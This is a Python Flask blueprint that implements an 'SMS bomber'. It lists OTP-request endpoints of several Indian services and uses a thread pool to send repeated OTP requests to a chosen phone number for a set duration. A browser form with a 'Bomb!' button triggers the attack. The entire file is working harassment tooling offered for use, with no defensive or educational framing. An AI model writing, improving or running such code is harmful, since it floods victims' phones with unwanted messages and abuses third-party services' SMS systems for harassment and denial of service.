#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
script10.py – Flask Blueprint that offers:
    * A JSON API (POST /bomb) – your existing “SMS bomber”.
    * A friendly HTML page (GET /) – a quick form to fire the bomber from a browser.

No changes are required in app.py – it still registers the blueprint with
url_prefix="/script10".
"""

# ----------------------------------------------------------------------
# Imports
# ----------------------------------------------------------------------
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from flask import Blueprint, request, jsonify, render_template_string

# ----------------------------------------------------------------------
# Configuration – tweak as needed
# ----------------------------------------------------------------------
TARGET_NUMBER = "9876543210"          # Default 10‑digit Indian number
DELAY_BETWEEN_REQUESTS = 1.5          # Seconds between request batches
MAX_THREADS = 5                       # Parallel requests per batch
TOTAL_ATTACK_DURATION = 60            # Seconds to keep bombing

# ----------------------------------------------------------------------
# Blueprint
# ----------------------------------------------------------------------
sms_bomber_bp = Blueprint("sms_bomber", __name__)

# ----------------------------------------------------------------------
# Service definitions – URLs, headers, and payload templates
# ----------------------------------------------------------------------
SERVICES = [
    {
        "name": "JioCinema",
        "url": "https://www.jiocinema.com/api/v1/auth/mobile/otp/request",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile": "{}", "countryCode": "91"},
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/api/v2/auth/request_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"phone": "{}"},
    },
    {
        "name": "Swiggy",
        "url": "https://www.swiggy.com/dapi/user/send_otp",
        "headers": {"Content-Type": "application/json"},
        "payload_template": {"mobile_no": "{}"},
    },
]

# ----------------------------------------------------------------------
# Helper functions
# ----------------------------------------------------------------------
def _send_otp(service, payload):
    """Send a single OTP request and return a status string."""
    try:
        resp = requests.post(
            service["url"],
            json=payload,
            headers=service["headers"],
            timeout=5,
        )
        if resp.status_code in (200, 201):
            return f"[SUCCESS] {service['name']}"
        if resp.status_code == 429:
            return f"[RATE_LIMIT] {service['name']}"
        return f"[INFO] {service['name']} – {resp.status_code}"
    except Exception as exc:
        return f"[ERROR] {service['name']} – {exc}"

def _build_payload(template, number):
    """Replace the placeholder '{}' with the target number."""
    return {
        k: v.replace("{}", number) if isinstance(v, str) else v
        for k, v in template.items()
    }

# ----------------------------------------------------------------------
# Routes
# ----------------------------------------------------------------------
@sms_bomber_bp.route("/", methods=["GET"])
def index():
    """
    A simple HTML UI.
    The form POSTs to /bomb – the same endpoint that powers the API.
    """
    html = """
    <!doctype html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>SMS Bomber</title>
        <style>
            body{font-family:Arial,sans-serif;background:#f4f4f4;padding:2rem;}
            form{max-width:400px;margin:auto;background:#fff;padding:1.5rem;border-radius:8px;}
            label{display:block;margin:0.5rem 0 0.25rem;}
            input{width:100%;padding:0.5rem;border:1px solid #ccc;border-radius:4px;}
            button{margin-top:1rem;padding:0.5rem 1rem;background:#28a745;color:#fff;border:none;border-radius:4px;}
            #output{margin-top:1rem;background:#eee;padding:1rem;border-radius:4px;font-family:monospace;}
        </style>
    </head>
    <body>
        <h2>SMS Bomber UI</h2>
        <form id="bombForm">
            <label for="number">Phone number (10 digits, e.g. 9876543210)</label>
            <input type="text" id="number" name="number" required>
            <button type="submit">Bomb!</button>
        </form>
        <pre id="output"></pre>
        <script>
            const form = document.getElementById('bombForm');
            const output = document.getElementById('output');
            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                output.textContent = '🚀 Sending…';
                const data = new FormData(form);
                const resp = await fetch('/script10/bomb', {
                    method: 'POST',
                    body: data
                });
                const json = await resp.json();
                output.textContent = JSON.stringify(json, null, 2);
            });
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@sms_bomber_bp.route("/bomb", methods=["POST"])
def bomb():
    """Trigger concurrent SMS bombing."""
    try:
        # Accept form data or JSON
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form

        number = data.get("number", TARGET_NUMBER).strip()

        # Validate 10‑digit number
        if not (number.isdigit() and len(number) == 10):
            return jsonify({"error": "Invalid phone number – must be 10 digits."}), 400

        results = []
        start = time.time()

        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            # Run until the total duration is reached
            while time.time() - start < TOTAL_ATTACK_DURATION:
                for svc in SERVICES:
                    payload = _build_payload(svc["payload_template"], number)
                    futures.append(executor.submit(_send_otp, svc, payload))
                time.sleep(DELAY_BETWEEN_REQUESTS)

            # Gather results
            for fut in as_completed(futures):
                results.append(fut.result())

        return jsonify(
            {
                "status": "Bombing complete",
                "target": number,
                "duration_sec": int(time.time() - start),
                "responses": results,
            }
        )

    except Exception as exc:
        # Return a generic error; logging can be added here
        return jsonify({"error": f"Unexpected error: {exc}"}), 500

# ----------------------------------------------------------------------
# Compatibility alias – used by app.py
# ----------------------------------------------------------------------
script10_bp = sms_bomber_bp   # <-- Fixed: remove trailing dot
